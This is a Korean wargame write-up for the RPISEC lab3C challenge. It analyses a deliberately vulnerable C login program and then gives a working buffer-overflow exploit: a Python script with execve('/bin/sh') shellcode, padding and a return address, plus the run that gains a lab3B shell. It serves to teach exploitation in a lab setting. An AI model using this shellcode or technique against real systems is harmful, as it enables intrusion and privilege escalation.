## 1. 문제 확인
- ID : lab3C
- Target : /level/lab03/lab3C
- flag : /home/lab3B/.pass
```
	lab3C@warzone:/levels/lab03$ ./lab3C
	********* ADMIN LOGIN PROMPT *********
	Enter Username: g4nzzi
	verifying username....

	nope, incorrect username...

	lab3C@warzone:/levels/lab03$
```

<br/><br/>
## 2. 취약점 분석
### 2.1 Source Code
```c
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>

	/* gcc -z execstack -fno-stack-protector -o lab3C lab3C.c */

	char a_user_name[100];

	int verify_user_name()
	{
    	puts("verifying username....\n");
    	return strncmp(a_user_name, "rpisec", 6);
	}

	int verify_user_pass(char *a_user_pass)
	{
    	return strncmp(a_user_pass, "admin", 5);
	}

	int main()
	{
    	char a_user_pass[64] = {0};
    	int x = 0;

    	/* prompt for the username - read 100 byes */
    	printf("********* ADMIN LOGIN PROMPT *********\n");
    	printf("Enter Username: ");
    	fgets(a_user_name, 0x100, stdin);

    	/* verify input username */
    	x = verify_user_name();
    	if (x != 0){
        	puts("nope, incorrect username...\n");
        	return EXIT_FAILURE;
    	}

    	/* prompt for admin password - read 64 bytes */
    	printf("Enter Password: \n");
    	fgets(a_user_pass, 0x64, stdin);

    	/* verify input password */
    	x = verify_user_pass(a_user_pass);
    	if (x == 0 || x != 0){
        	puts("nope, incorrect password...\n");
        	return EXIT_FAILURE;
    	}

    	return EXIT_SUCCESS;
	}
```
### 2.2 Code 분석
#### 2.2.1 main()
- 전역변수 a_user_name 은 100byte 크기이지만 fgets()함수를 통해 256byte(0x100)를 입력받을 수 있으므로 overflow 발생 가능
```c
	char a_user_name[100];
  ...
  printf("********* ADMIN LOGIN PROMPT *********\n");
  printf("Enter Username: ");
  fgets(a_user_name, 0x100, stdin);
  ...
```
- 지역변수 a_user_pass 는 64byte 크기이지만 fgets()함수를 통해 100byte(0x64)를 입력받을 수 있으므로 overflow 발생 가능
```c
	char a_user_pass[64] = {0};
  ...
  printf("Enter Password: \n");
  fgets(a_user_pass, 0x64, stdin);
  ...
```
- a_user_name 는 초기화되지 않은 전역변수이므로 bss 섹션에 위치하고, 프로그램 실행 시 메모리 주소 확인이 가능함 (a_user_pass 는 지역변수이기 때문에 stack에 위치함)
```
	gdb-peda$ info variables
	All defined variables:

	...
	0x08049c20  stdin@@GLIBC_2.0
	0x08049c24  completed
	0x08049c40  a_user_name
	0x08049ca4  _end
	gdb-peda$
```
- a_user_pass 값에 104byte(AAAA~ZZZZ)를 입력하면 overflow가 발생하고 main()함수 리턴주소 위치가 UUUU(0x55555555) 부분임을 확인할 수 있음
```
	Starting program: /levels/lab03/lab3C
	********* ADMIN LOGIN PROMPT *********
	Enter Username: rpisec
	verifying username....

	Enter Password:	AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
  ...
  Stopped reason: SIGSEGV
	0x55555555 in ?? ()
	gdb-peda$
```
```
	[   a_user_pass  ] [dummy] [SFP][RET]
  AAAABBBBCCCCDDDDEEEEFFFF ~~ TTTTUUUUVVVVWWWWXXXXYYYYZZZZ
	                                ^
	|----------  (80byte) --------- |
```
- 쉘코드를 a_user_name 변수에 저장하고 a_user_pass 입력을 통해 overflow를 발생시켜, main()함수 리턴 주소를 쉘코드가 저장된 주소로 변경

<br/><br/>
## 3. Exploit
- verify_user_name() 체크를 통과하기 위해 "rpisec"(6byte) 문자와 쉘코드를 첫번째 입력값으로 넣고, 두번째 입력에서 임의의 80byte 문자와 리턴(쉘코드)주소를 입력함
  (쉘코드 주소는 a_user_name 주소(0x08049c40) + 6byte)
```python
	print("rpisec"+ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")

	print("a"*80 + "\x46\x9c\x04\x08")
```
- 작성된 코드를 실행하여 입력 데이터를 만들고, 프로그램 실행 인자로 전달하면 쉘 획득
```
	lab3C@warzone:/levels/lab03$ python /tmp/lab3c.py > /tmp/lab3c_input
	lab3C@warzone:/levels/lab03$ (cat /tmp/lab3c_input; cat) | ./lab3C
	********* ADMIN LOGIN PROMPT *********
	Enter Username: verifying username....

	Enter Password:
	nope, incorrect password...

	id
	uid=1010(lab3C) gid=1011(lab3C) euid=1011(lab3B) groups=1012(lab3B),1001(gameuser),1011(lab3C)
```
